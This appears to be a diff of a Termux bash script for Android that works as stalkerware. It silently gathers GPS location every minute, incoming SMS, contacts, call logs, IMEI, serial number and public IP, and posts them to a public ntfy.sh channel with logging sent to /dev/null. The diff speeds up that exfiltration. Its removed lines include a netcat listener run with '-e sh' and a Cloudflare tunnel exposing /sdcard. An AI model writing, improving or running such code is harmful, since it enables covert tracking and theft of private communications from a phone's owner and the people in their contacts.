@@ -1,190 +1,182 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-# === CONFIGURACIÓN ===
-NTFY_URL="https://ntfy.sh/V09ci1z1J2A1Iawp"  # tu canal NTFY público
-INTERVALO=3600  # Intervalo principal en segundos (1 hora)
-LOC_INTERVAL=300  # Intervalo para ubicación (5 minutos)
+# ===== CONFIGURACIÓN ACELERADA =====
+NTFY_URL="https://ntfy.sh/V09ci1z1J2A1Iawp"  # Tu canal NTFY
+INTERVALO=300  # Intervalo principal: 5 minutos (reducido desde 1 hora)
+LOC_INTERVAL=60  # Intervalo ubicación: 1 minuto (reducido desde 5 minutos)
+SMS_CHECK_INTERVAL=15  # Chequeo SMS: 15 segundos (reducido desde 30)
 LOGFILE="/dev/null"
 SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"
+MAX_PARALLEL=4  # Máximo de envíos simultáneos
+TEMP_DIR="$HOME/.temp_ntfy"  # Directorio para archivos temporales
 
-# === INSTALAR DEPENDENCIAS FALTANTES ===
-if ! command -v jq &> /dev/null; then
-    echo "Instalando jq..."
-    pkg install -y jq
-fi
+# ===== INICIALIZACIÓN =====
+mkdir -p "$TEMP_DIR"
+cleanup() {
+    rm -rf "$TEMP_DIR"/*
+    kill $(jobs -p) 2>/dev/null
+    exit
+}
+trap cleanup EXIT
 
-if ! command -v termux-location &> /dev/null; then
-    echo "Instalando Termux:API..."
-    pkg install -y termux-api
-fi
+# ===== FUNCIONES PRINCIPALES =====
 
-# === FUNCIÓN PARA ENVIAR MENSAJES ===
+# Función de envío ultra-rápida con control de paralelismo
 enviar_ntfy() {
-    curl -s -d "$1" "$NTFY_URL" > $LOGFILE 2>&1
+    # Controlar el número de procesos paralelos
+    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
+        sleep 0.1
+    done
+    
+    # Envío asíncrono con timeout corto
+    curl -s \
+         -m 10 \
+         -H "Priority: high" \
+         -H "Tags: rocket" \
+         -H "X-Message-TTL: 30" \
+         -d "$1" \
+         "$NTFY_URL" > "$LOGFILE" 2>&1 &
 }
 
-# === FUNCIÓN PARA OBTENER UBICACIÓN ===
+# Obtención relámpago de ubicación
 obtener_ubicacion() {
-    local intentos=0
-    local ubicacion=""
+    local ubicacion=$(timeout 5 termux-location -p network,gps -r once 2>/dev/null)
     
-    # Intentamos primero con GPS, luego con red
-    while [ $intentos -lt 3 ] && [ -z "$ubicacion" ]; do
-        ubicacion=$(termux-location -p gps -r once 2>/dev/null)
-        if [ -z "$ubicacion" ]; then
-            ubicacion=$(termux-location -p network -r once 2>/dev/null)
-        fi
-        intentos=$((intentos+1))
-        sleep 2
-    done
-    
-    echo "$ubicacion"
-}
-
-# === MONITOREO DE UBICACIÓN ===
-monitor_ubicacion() {
-    while true; do
-        ubicacion=$(obtener_ubicacion)
-        if [ -n "$ubicacion" ]; then
-            LAT=$(echo "$ubicacion" | jq -r '.latitude')
-            LON=$(echo "$ubicacion" | jq -r '.longitude')
-            ACC=$(echo "$ubicacion" | jq -r '.accuracy // "unknown"')
-            
-            enviar_ntfy "📍 Ubicación: 
-Latitud: $LAT
-Longitud: $LON
-Precisión: $ACC metros
-🗺️ https://www.google.com/maps?q=$LAT,$LON"
-        else
-            enviar_ntfy "⚠️ No se pudo obtener ubicación"
-        fi
-        sleep $LOC_INTERVAL
-    done
-}
-
-# === FUNCIÓN PRINCIPAL DE RECOPILACIÓN ===
-recopilar_datos() {
-    # 1. Info del dispositivo
-    IP=$(curl -s ifconfig.me)
-    BAT=$(termux-battery-status | jq -c '.' 2>/dev/null)
-    MODEL=$(getprop ro.product.model)
-    SERIAL=$(getprop ro.serialno)
-    SIMINFO=$(termux-telephony-siminfo 2>/dev/null | jq -c '.')
-    DEVICEINFO=$(termux-telephony-deviceinfo 2>/dev/null | jq -c '.')
-
-    IMEI=$(echo "$DEVICEINFO" | jq -r '.device_id')
-
-    enviar_ntfy "📱 Modelo: $MODEL"
-    enviar_ntfy "🔑 Serial: $SERIAL"
-    [ "$IMEI" != "null" ] && enviar_ntfy "🔐 IMEI: $IMEI"
-    [ -n "$BAT" ] && enviar_ntfy "🔋 Batería: $BAT"
-    [ -n "$IP" ] && enviar_ntfy "🌐 IP: $IP"
-    [ -n "$SIMINFO" ] && enviar_ntfy "📶 SIM: $SIMINFO"
-    [ -n "$DEVICEINFO" ] && enviar_ntfy "📡 Red: $DEVICEINFO"
-
-    # 2. Contactos (solo 5)
-    CONTACTOS=$(termux-contact-list 2>/dev/null)
-    if [ -n "$CONTACTOS" ]; then
-        echo "$CONTACTOS" | jq -c '.[0:5][]' | while read -r contacto; do
-            enviar_ntfy "👤 Contacto: $contacto"
-            sleep 1
-        done
-    fi
-
-    # 3. Últimos SMS (3)
-    SMS=$(termux-sms-list -l 3 2>/dev/null)
-    if [ -n "$SMS" ]; then
-        echo "$SMS" | jq -c '.[]' | while read -r sms; do
-            enviar_ntfy "📩 SMS: $sms"
-            sleep 1
-        done
-    fi
-
-    # 4. Llamadas recientes (5)
-    CALLS=$(termux-call-log -l 5 2>/dev/null)
-    if [ -n "$CALLS" ]; then
-        echo "$CALLS" | jq -c '.[]' | while read -r call; do
-            enviar_ntfy "📞 Llamada: $call"
-            sleep 1
-        done
+    if [ -n "$ubicacion" ]; then
+        local LAT=$(echo "$ubicacion" | jq -r '.latitude')
+        local LON=$(echo "$ubicacion" | jq -r '.longitude')
+        local ACC=$(echo "$ubicacion" | jq -r '.accuracy // "N/A"')
+        
+        enviar_ntfy "🚀 Ubicación Instantánea:
+🗺️ https://www.google.com/maps?q=$LAT,$LON
+📡 Precisión: $ACC metros" &
+    else
+        enviar_ntfy "⚠️ Ubicación no obtenida (timeout)" &
     fi
 }
 
-# === MONITOREO DE NUEVOS SMS ===
+# Monitor de SMS de alto rendimiento
 monitor_sms() {
     [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
+    local last_check=$(date +%s)
     
     while true; do
-        ULTIMO_SMS=$(termux-sms-list -l 1 2>/dev/null | jq -c '.[0]')
-        if [ -n "$ULTIMO_SMS" ]; then
-            CURRENT_ID=$(echo "$ULTIMO_SMS" | jq -r '._id')
-            LAST_ID=$(cat "$SMS_LAST_ID_FILE")
-            if [ "$CURRENT_ID" != "$LAST_ID" ] && [ "$CURRENT_ID" != "null" ]; then
-                enviar_ntfy "📩 NUEVO SMS: $ULTIMO_SMS"
-                echo "$CURRENT_ID" > "$SMS_LAST_ID_FILE"
-            fi
+        local current_sms=$(timeout 10 termux-sms-list -d "since $last_check" 2>/dev/null)
+        
+        if [ -n "$current_sms" ]; then
+            echo "$current_sms" | jq -c '.[]' | while read -r sms; do
+                local msg_id=$(echo "$sms" | jq -r '._id')
+                local last_id=$(cat "$SMS_LAST_ID_FILE")
+                
+                if [ "$msg_id" != "$last_id" ] && [ "$msg_id" != "null" ]; then
+                    enviar_ntfy "📩 SMS RÁPIDO: $(echo "$sms" | jq -c 'del(._id)')" &
+                    echo "$msg_id" > "$SMS_LAST_ID_FILE"
+                fi
+            done
         fi
-        sleep 30  # Verificar cada 30 segundos
+        
+        last_check=$(date +%s)
+        sleep "$SMS_CHECK_INTERVAL"
     done
 }
 
-# === EJECUCIÓN PRINCIPAL ===
-# Verificar y solicitar permisos necesarios
-termux-location >/dev/null 2>&1
-termux-sms-list >/dev/null 2>&1
+# Recopilación paralelizada de datos
+recopilar_datos() {
+    # Sistema y hardware (paralelo)
+    obtener_info_dispositivo &
+    
+    # Red y conectividad (paralelo)
+    obtener_info_red &
+    
+    # Datos personales (paralelo con delay)
+    (sleep 2; obtener_datos_personales) &
+    
+    # Esperar finalización
+    wait
+}
+
+# ===== FUNCIONES SECUNDARIAS =====
+
+obtener_info_dispositivo() {
+    local MODEL=$(getprop ro.product.model)
+    local SERIAL=$(getprop ro.serialno)
+    local BAT=$(timeout 5 termux-battery-status 2>/dev/null)
+    
+    enviar_ntfy "⚡ Dispositivo:
+Modelo: $MODEL
+Serial: $SERIAL" &
+    
+    [ -n "$BAT" ] && enviar_ntfy "🔋 Batería: $(echo "$BAT" | jq -c '.')" &
+}
+
+obtener_info_red() {
+    local IP=$(timeout 5 curl -s ifconfig.me)
+    local NETINFO=$(timeout 5 termux-telephony-deviceinfo 2>/dev/null)
+    
+    [ -n "$IP" ] && enviar_ntfy "🌐 IP Pública: $IP" &
+    
+    if [ -n "$NETINFO" ]; then
+        local IMEI=$(echo "$NETINFO" | jq -r '.device_id')
+        [ "$IMEI" != "null" ] && enviar_ntfy "📶 IMEI: $IMEI" &
+        
+        enviar_ntfy "📡 Estado Red: $(echo "$NETINFO" | jq -c 'del(.device_id)')" &
+    fi
+}
+
+obtener_datos_personales() {
+    # Contactos (sólo 3 para velocidad)
+    timeout 10 termux-contact-list 2>/dev/null | jq -c '.[0:3][]' | while read -r contacto; do
+        enviar_ntfy "👤 Contacto Rápido: $contacto" &
+        sleep 0.5  # Pequeño delay para evitar saturación
+    done
+    
+    # Llamadas recientes (sólo 3)
+    timeout 10 termux-call-log -l 3 2>/dev/null | jq -c '.[]' | while read -r llamada; do
+        enviar_ntfy "📞 Última Llamada: $llamada" &
+        sleep 0.5
+    done
+}
+
+# ===== MONITOREO DE UBICACIÓN =====
+monitor_ubicacion() {
+    while true; do
+        obtener_ubicacion
+        sleep "$LOC_INTERVAL"
+    done
+}
+
+# ===== VERIFICACIÓN RÁPIDA DE DEPENDENCIAS =====
+check_deps() {
+    local deps=("jq" "termux-location" "curl" "timeout")
+    
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" &>/dev/null; then
+            echo "Instalando $dep..."
+            pkg install -y "$dep" >/dev/null 2>&1 &
+        fi
+    done
+    wait
+}
+
+# ===== EJECUCIÓN PRINCIPAL =====
+check_deps
+
+# Enviar notificación de inicio
+enviar_ntfy "🚀 Script de monitoreo iniciado (modo rápido)" &
 
 # Iniciar todos los monitores en segundo plano
-recopilar_datos
 monitor_ubicacion &
 monitor_sms &
 
-# Mantener el script activo
+# Bucle principal optimizado
 while true; do
-    sleep $INTERVALO
+    start_time=$(date +%s)
+    
     recopilar_datos
-done
-# === CONFIGURACIÓN ADICIONAL PARA TUNNEL ===
-TUNNEL_PORT=8080  # Puerto local para el servidor de archivos
-TUNNEL_NAME="termux-tunnel"  # Nombre identificador del tunnel
-
-# === INSTALAR CLOUDFLARED ===
-if ! command -v cloudflared &> /dev/null; then
-    echo "Instalando cloudflared..."
-    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O $PREFIX/bin/cloudflared
-    chmod +x $PREFIX/bin/cloudflared
-fi
-
-# === FUNCIÓN PARA INICIAR SERVIDOR DE ARCHIVOS ===
-start_file_server() {
-    while true; do
-        echo "📂 Servidor de archivos iniciado en puerto $TUNNEL_PORT" | enviar_ntfy
-        cd /sdcard/
-        nc -lvp $TUNNEL_PORT -e sh -c 'echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"; ls -la'
-    done &
-}
-
-# === FUNCIÓN PARA INICIAR TUNNEL CLOUDFLARE ===
-start_cloudflare_tunnel() {
-    while true; do
-        echo "🛰️ Iniciando tunnel Cloudflare..." | enviar_ntfy
-        cloudflared tunnel --url http://localhost:$TUNNEL_PORT --name $TUNNEL_NAME 2>&1 | while read -r line; do
-            if [[ "$line" == *"https://"* ]]; then
-                URL=$(echo "$line" | grep -o 'https://[^ ]*')
-                enviar_ntfy "🔗 URL del Tunnel: $URL"
-            fi
-        done
-        sleep 10
-    done &
-}
-
-# === MODIFICACIÓN A LA EJECUCIÓN PRINCIPAL ===
-# Agregar estas líneas justo antes del bucle principal
-
-start_file_server
-start_cloudflare_tunnel
-
-# Mantener el script activo (esta parte ya existe)
-while true; do
-    sleep $INTERVALO
-    recopilar_datos
+    
+    # Cálculo dinámico del sleep para mantener el intervalo exacto
+    execution_time=$(( $(date +%s) - start_time ))
+    remaining_time=$(( INTERVALO - execution_time ))
+    
+    [ $remaining_time -gt 0 ] && sleep $remaining_time
 done
